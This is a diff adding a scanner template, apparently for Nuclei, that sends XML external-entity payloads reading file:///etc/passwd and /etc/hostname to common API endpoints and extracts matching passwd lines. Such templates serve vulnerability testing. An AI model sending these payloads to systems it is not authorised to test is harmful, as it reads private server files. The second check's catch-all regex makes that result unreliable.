@@ -1,0 +1,104 @@
+id: xxe-xml-body-file-read
+
+info:
+  name: XXE via XML POST Body — /etc/passwd File Read
+  author: TyrusRC
+  severity: high
+  description: |
+    Sends XXE payloads as full XML POST bodies to endpoints that accept
+    application/xml. The entity expands file:///etc/passwd (classic) and
+    file:///etc/hostname (alternative). Targets common XML-accepting
+    paths including /search, /api/search, /xmlrpc.php, /soap, /import.
+    The payload wraps the entity reference in common element names
+    (user, query, data, input, request, search) to match real API schemas.
+  reference:
+    - https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+    - https://cwe.mitre.org/data/definitions/611.html
+  tags: custom,vulnerabilities,xxe,xml,file-read
+
+http:
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE {{element}} [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+        <{{element}}>&xxe;</{{element}}>
+
+    payloads:
+      path:
+        - "/search"
+        - "/api/search"
+        - "/xmlrpc.php"
+        - "/soap"
+        - "/api/xml"
+        - "/import"
+        - "/api"
+        - "/upload"
+      element:
+        - "user"
+        - "query"
+        - "data"
+        - "search"
+        - "input"
+
+    attack: clusterbomb
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+      - type: regex
+        part: body
+        regex:
+          - 'root:[x*]:0:0:'
+          - 'daemon:[x*]:\d+:\d+:'
+          - 'nobody:[x*]:\d+:\d+:'
+        condition: or
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - '(root:[x*]:0:0:[^<\r\n]{0,80})'
+
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
+        <root><{{element}}>&xxe;</{{element}}></root>
+
+    payloads:
+      path:
+        - "/search"
+        - "/api/search"
+      element:
+        - "user"
+        - "query"
+
+    attack: clusterbomb
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<!ENTITY"
+      - type: regex
+        part: body
+        regex:
+          - '[a-z0-9][-a-z0-9]{0,62}'
+        condition: or
